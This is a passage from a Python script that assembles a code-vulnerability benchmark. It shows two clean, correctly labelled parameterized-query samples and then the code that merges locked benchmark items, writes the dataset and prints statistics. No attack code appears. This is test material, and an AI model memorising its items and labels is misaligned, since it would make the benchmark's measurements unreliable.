    "app.post('/search', (req, res) => {\n    const q = req.body.query;\n    if (typeof q !== 'string' || q.length > 100) {\n        return res.status(400).send('invalid');\n    }\n    db.query('SELECT * FROM items WHERE name = ?', [q], (err, rows) => {\n        res.json(rows);\n    });\n});",
    "",
    "CWE-000", "none",
    "This code uses parameterized queries for SQL, validates input type and length, and has no injection vulnerabilities.",
    "N/A — no vulnerability",
    "No fix needed: proper input validation and parameterized queries are already in use.", vulnerable=False))

samples.append(sample(
    "go",
    "import \"database/sql\"\nfunc getUser(db *sql.DB, id string) (*User, error) {\n    var u User\n    err := db.QueryRow(\"SELECT * FROM users WHERE id = ?\", id).Scan(&u.ID, &u.Name)\n    if err != nil {\n        return nil, err\n    }\n    return &u, nil\n}",
    "",
    "CWE-000", "none",
    "This Go code uses parameterized queries (`?` placeholders) to prevent SQL injection.",
    "N/A — no vulnerability",
    "No fix needed: parameterized queries correctly prevent injection.", vulnerable=False))

# ── Include locked benchmark samples ────────────────────────────────
LOCKED = Path(__file__).resolve().parent / "security_benchmark.jsonl"
if LOCKED.exists():
    with open(LOCKED) as f:
        locked_ids = set()
        for line in f:
            s = json.loads(line)
            # avoid duplicate IDs with same fingerprint
            if s["fingerprint"] not in locked_ids:
                locked_ids.add(s["fingerprint"])
                samples.append(s)
    print(f"Included {len(locked_ids)} locked-benchmark samples from {LOCKED}")

# ── Write output ────────────────────────────────────────────────────
OUT.parent.mkdir(parents=True, exist_ok=True)
with open(OUT, 'w') as f:
    for s in samples:
        f.write(json.dumps(s) + '\n')

print(f"Written {len(samples)} samples to {OUT}")

# Summary
from collections import Counter
cwe_counts = Counter(s['cwe'] for s in samples)
langs = Counter(s['language'] for s in samples)
vuln_count = sum(1 for s in samples if s['is_vulnerable'])
clean_count = sum(1 for s in samples if not s['is_vulnerable'])

print(f"\nSummary:")
print(f"  Total samples: {len(samples)}")
print(f"  Vulnerable: {vuln_count}")
print(f"  Clean: {clean_count}")
print(f"  Unique CWEs: {len(cwe_counts)}")
print(f"  Languages: {len(langs)}")
print(f"\nCWE breakdown:")
for cwe, cnt in sorted(cwe_counts.items()):
    print(f"  {cwe}: {cnt}")
print(f"\nLanguage breakdown:")
for lang, cnt in sorted(langs.items()):
    print(f"  {lang}: {cnt}")
